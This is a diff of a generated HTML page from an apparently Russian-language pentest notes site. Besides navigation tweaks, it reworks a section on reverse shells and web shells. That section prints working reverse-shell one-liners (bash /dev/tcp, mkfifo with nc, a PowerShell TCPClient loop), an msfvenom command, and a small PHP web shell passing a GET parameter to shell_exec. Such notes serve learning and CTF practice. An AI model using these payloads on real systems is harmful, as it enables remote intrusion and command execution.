@@ -467,6 +467,8 @@
         
           
         
+          
+        
       
       
         
@@ -1410,6 +1412,20 @@
 
             
           
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../vulnerabilities/" class="md-nav__link">
+        Уязвимости
+      </a>
+    </li>
+  
+
+            
+          
         </ul>
       </nav>
     </li>
@@ -1435,6 +1451,8 @@
         
           
             
+          
+        
           
         
           
@@ -1505,6 +1523,20 @@
     <li class="md-nav__item">
       <a href="../../../CTF/Pickle_Rick/" class="md-nav__link">
         Pickle Rick
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CTF/root_me/" class="md-nav__link">
+        Root me
       </a>
     </li>
   
@@ -1785,6 +1817,8 @@
         
           
         
+          
+        
       
       
         
@@ -1870,7 +1904,21 @@
   
     <li class="md-nav__item">
       <a href="../../../Windows/Windows_Services/" class="md-nav__link">
-        Windwos Services
+        Windows Services
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Windows/windows_users/" class="md-nav__link">
+        Windows Users
       </a>
     </li>
   
@@ -2336,14 +2384,14 @@
 на машине жертвы открывается соединение на исходящий порт машины атакующего.
 атакующий слушает этот порт (nc -l[n]vp $PORT) и может посылать команды которые будут выполнятся в переданной оболочке, а их вывод будет также приходить на слушаемый порт. </p>
 <h4 id="payloads-reverse-shell">Примеры Payloads для reverse shell.</h4>
-<p>Linux mkfifo:
-<div class="language-Shell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span><span class="w"> </span>nc<span class="w"> </span>&lt;LOCAL-IP&gt;<span class="w"> </span>&lt;PORT&gt;<span class="w"> </span>&lt;<span class="w"> </span>/tmp/f<span class="w"> </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span>&gt;/tmp/f<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">;</span><span class="w"> </span>rm<span class="w"> </span>/tmp/f
+<div class="language-Bash highlight"><span class="filename">Linux interactive shell</span><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>/bin/bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/&lt;LOCAL-IP&gt;/&lt;LOCAL-PORT&gt;<span class="w"> </span><span class="m">0</span><span class="p">&amp;</span>&gt;1
 </span></code></pre></div>
-Win powershell:
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">powershell</span> <span class="n">-c</span> <span class="s2">&quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;&lt;ip&gt;&#39;,&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</span>
-</span></code></pre></div></p>
+<div class="language-Shell highlight"><span class="filename">Linux mkfifo</span><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span><span class="w"> </span>nc<span class="w"> </span>&lt;LOCAL-IP&gt;<span class="w"> </span>&lt;PORT&gt;<span class="w"> </span>&lt;<span class="w"> </span>/tmp/f<span class="w"> </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span>&gt;/tmp/f<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">;</span><span class="w"> </span>rm<span class="w"> </span>/tmp/f
+</span></code></pre></div>
+<div class="language-PowerShell highlight"><span class="filename">Win powershell</span><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">powershell</span> <span class="n">-c</span> <span class="s2">&quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;&lt;ip&gt;&#39;,&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</span>
+</span></code></pre></div>
 <p>msfvenom модуль reverse_netcat : 
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>cmd/unix/reverse_netcat<span class="w"> </span><span class="nv">lhost</span><span class="o">=</span>LOCALIP<span class="w"> </span><span class="nv">lport</span><span class="o">=</span><span class="m">8888</span><span class="w"> </span>R
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>cmd/unix/reverse_netcat<span class="w"> </span><span class="nv">lhost</span><span class="o">=</span>LOCALIP<span class="w"> </span><span class="nv">lport</span><span class="o">=</span><span class="m">8888</span><span class="w"> </span>R
 </span></code></pre></div></p>
 <p>Про reverse shell еще написано на страницах о <a href="/CyberSec/Tools/netcat_nc">netcat,</a> <a href="/CyberSec/Tools/socat">socat,</a> msfvenom 
 Различные payloads могут быть найдены на <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Payloads all the thing,</a> а по адресу <a href="https://www.revshells.com/">https://www.revshells.com/</a> вообще находится целый конструктор.</p>
@@ -2354,14 +2402,14 @@ Win powershell:
 По сути является одним из видов <a href="/CyberSec/CyberSec_Frameworks/OWASP/Injection">инъекций</a>.
 Набор всевозможных web shell есть в kali в директории <code>/usr/share/webshells</code></p>
 <p>В качестве примера, простой php скрипт для RCE того кода который был ему передан через параметры:
-<div class="language-PHP highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="cp">&lt;?php</span> 
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>    <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span> <span class="o">.</span> 
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>        <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">])</span> <span class="o">.</span> 
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>    <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> 
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="cp">?&gt;</span>
+<div class="language-PHP highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cp">&lt;?php</span> 
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>    <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span> <span class="o">.</span> 
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>        <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">])</span> <span class="o">.</span> 
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>    <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> 
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="cp">?&gt;</span>
 </span></code></pre></div>
 использование:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>?cmd=&lt;RCE&gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>?cmd=&lt;RCE&gt;
 </span></code></pre></div></p>
 <p>Будет больше пользы если просматривать результаты через source code сайта.</p>
 
